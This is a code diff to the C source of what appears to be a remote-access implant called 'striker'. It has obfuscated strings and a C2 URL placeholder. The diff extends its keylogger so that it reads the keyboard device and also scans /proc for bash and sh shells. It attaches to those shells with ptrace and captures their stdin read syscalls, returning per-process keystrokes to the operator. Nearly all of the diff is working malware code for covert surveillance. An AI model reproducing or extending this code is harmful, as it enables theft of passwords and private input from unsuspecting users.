@@ -9,14 +9,18 @@
 
 // Set to non-zero value for debug outputs.
 #define STRIKER_DEBUG 1
+// Size of agent UID
+#define AGENT_UID_SIZE 17
 // Max task result size in bytes
 #define MAX_RES_SIZE (sizeof(char) * 102400)
 // Max number of tasks to queue.
 #define MAX_TASKS_QUEUE 100
-// Max number of keystrokes to collect by the key logger
-#define MAX_KEYSTROKES 50000
-// Size of agent UID
-#define AGENT_UID_SIZE 17
+// Max number of keystrokes to collect by keymon
+#define KEYMON_MAX_KEYSTROKES 50000
+// Max number of processes to hook by keymon
+#define KEYMON_MAX_PROCS 100
+// Keymon's process refresh rate (in secs)
+#define KEYMON_PROC_DELAY 1
 
 #define URL_SIZE (sizeof(char) * 256)
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
@@ -146,14 +150,14 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
   return 1;
 }
 
-void keymon(task *tsk){
+void keymon(session *striker, task *tsk){
 
-  char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]loggedKeys"};
+  char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]main-kbd"};
   for (int i = 0; i < 7; i++)
     obfs_decode(strs[i]);
   cJSON *data = tsk->data;
   unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
-  unsigned char *keys = malloc(sizeof(unsigned char) * MAX_KEYSTROKES);
+  unsigned char *keys = malloc(sizeof(unsigned char) * KEYMON_MAX_KEYSTROKES);
   size_t count = 0;
   buffer *result_buff = create_buffer(0);
   int kb = open(strs[1], O_RDONLY);
@@ -164,8 +168,17 @@ void keymon(task *tsk){
   fd_set set;
   struct timeval timeout = {1, 0};
   struct input_event e;
-  unsigned long end_time = ((unsigned long)time(NULL)) + duration;
-  while (count < MAX_KEYSTROKES && ((unsigned long)time(NULL)) < end_time){
+  time_t end_time = time(NULL) + duration;
+  
+  queue *km_proc_dumps = queue_init(KEYMON_MAX_PROCS);
+  queue *km_proc_arg = queue_init(3);
+  queue_put(km_proc_arg, striker);
+  queue_put(km_proc_arg, &end_time);
+  queue_put(km_proc_arg, km_proc_dumps);
+  pthread_t tid;
+  pthread_create(&tid, NULL, keymon_proc_watch, km_proc_arg);
+
+  while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time){
     timeout.tv_sec = 1;
     FD_ZERO(&set);
     FD_SET(kb, &set);
@@ -182,6 +195,29 @@ void keymon(task *tsk){
   }
   close(kb);
 
+  printf("[*] keymon: waiting for proc watcher...\n");
+  pthread_join(tid, NULL);
+  printf("[+] keymon: proc watcher quit...\n");
+
+  queue_seek(km_proc_dumps, 0);
+  while (!queue_exhausted(km_proc_dumps)){
+    queue *km_result = queue_get(km_proc_dumps);
+    queue_seek(km_result, 2);
+    pid_t *pid = queue_get(km_result);
+    cJSON *proc_keys = cJSON_CreateArray();
+    while (!queue_exhausted(km_result)){
+      unsigned char *key = queue_get(km_result);
+      cJSON_AddItemToArray(proc_keys, cJSON_CreateNumber(*key));
+      free(key);
+    }
+    char pid_str[8];
+    snprintf(pid_str, 8, "%d", *pid);
+    cJSON_AddItemToObject(tsk->result, pid_str, proc_keys);
+    queue_free(km_result, 0);
+    free(pid);
+  }
+  queue_free(km_proc_dumps, 0);
+
   complete:
     cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
     if (count > 0){
@@ -196,6 +232,127 @@ void keymon(task *tsk){
     tsk->completed = 1;
     free(keys);
     free_buffer(result_buff);
+}
+
+void *keymon_proc_watch(void *ptr){
+
+  printf("[*] Watching processes...\n");
+  char strs[][40] = {"[OBFS_ENC]/proc", "[OBFS_ENC]/proc/%d/cmdline"};
+  for (int i = 0; i < 2; i++)
+    obfs_decode(strs[i]);
+  char targets[][50] = {"[OBFS_ENC]-bash", "[OBFS_ENC]bash" , "[OBFS_ENC]/bin/bash", "[OBFS_ENC]/usr/bin/bash", "[OBFS_ENC]sh", "[OBFS_ENC]/bin/sh", "[OBFS_ENC]/usr/bin/sh"};
+  for (int i = 0; i < 7; i++)
+    obfs_decode(targets[i]);
+  queue *q = (queue *)ptr;
+  session *striker = queue_get(q);
+  time_t *end_time = queue_get(q);
+  queue *results_queue = queue_get(q);
+  pthread_t tids[KEYMON_MAX_PROCS];
+  pid_t pids[KEYMON_MAX_PROCS];
+  size_t attached_count = 0;
+  while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time){
+    struct dirent *dir;
+    DIR *d = opendir(strs[0]);
+    if (!d){
+      printf("[+] Error listing procs!\n");
+      break;
+    }
+    while ((dir = readdir(d)) != NULL && attached_count < KEYMON_MAX_PROCS){
+      if (dir->d_type == DT_DIR){
+        pid_t *pid = malloc(sizeof(pid_t));
+        *pid = atoi(dir->d_name);
+        if (*pid == 0){
+          free(pid);
+          continue;
+        }
+        unsigned char watched = 0;
+        for (int i = 0; i < attached_count; i++){
+          if (pids[i] == *pid){
+            watched = 1;
+            break;
+          }
+        }
+        if (watched){
+          free(pid);
+          continue;
+        }
+        char *filename = malloc(50);
+        snprintf(filename, 50, strs[1], *pid);
+        FILE *rfo = fopen(filename, "r");
+        if (!rfo){
+          free(filename);
+          free(pid);
+          continue;
+        }
+        fgets(filename, 50, rfo);
+        int valid = 0;
+        for (int i = 0; i < 7; i++){
+          if (!strcmp(targets[i], filename)){
+            valid = 1;
+            break;
+          }
+        }
+        if (!valid){
+          fclose(rfo);
+          free(filename);
+          free(pid);
+          continue;
+        }
+        printf("[*] Creating thread for %d...\n", *pid);
+        queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 3);
+        queue_put(data, striker);
+        queue_put(data, end_time);
+        queue_put(data, pid);
+        queue_put(results_queue, data);
+        pthread_create(tids + attached_count, NULL, keymon_proc_attach, data);
+        pids[attached_count] = *pid;
+        attached_count++;
+      }
+    }
+    closedir(d);
+    sleep(KEYMON_PROC_DELAY);
+  }
+  printf("[+] proc watcher: waiting...\n");
+  for (int i = 0; i < attached_count; i++)
+    pthread_join(tids[i], NULL);
+  printf("[+] proc watcher: childs closed...\n");
+  pthread_exit(NULL);
+}
+
+void *keymon_proc_attach(void *ptr){
+
+  queue *q = (queue *)ptr;
+  session *striker = queue_get(q);
+  time_t *end_time = queue_get(q);
+  pid_t *pid = queue_get(q);
+  int status;
+  struct user_regs_struct regs;
+  printf("[*] Attaching to PID: %d\n", *pid);
+  if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
+    pthread_exit(NULL);
+  printf("[+] Attached to %d\n", *pid);
+  ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
+  while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time){
+    ptrace(PTRACE_SYSCALL, *pid, 0, 0);
+    waitpid(*pid, &status, 0);
+    if (WIFEXITED(status))
+      break;
+    ptrace(PTRACE_GETREGS, *pid, 0, &regs);
+    if (regs.orig_rax == 0 && regs.rdi == 0){
+      unsigned char *val = malloc(sizeof(unsigned char));
+      *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.rsi, 0);
+      if (*val != 0){
+        printf("key: 0x%02x\n", *val);
+        queue_put(q, val);
+      }else{
+        free(val);
+      }
+    }
+  }
+  printf("[+] %d closing...\n", *pid);
+  ptrace(PTRACE_DETACH, *pid, NULL, NULL);
+  printf("[+] %d closed!\n", *pid);
+  pthread_exit(NULL);
 }
 
 task *parse_task(cJSON *json){
@@ -308,7 +465,7 @@ void *task_executor(void *ptr){
     strncpy(striker->write_dir, dir, PATH_MAX);
     buffer_strcpy(result_buff, strs[1]);
   }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
-    keymon(tsk);
+    keymon(striker, tsk);
   }else if (!strcmp(tsk->type, cmd_strs[5])){
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
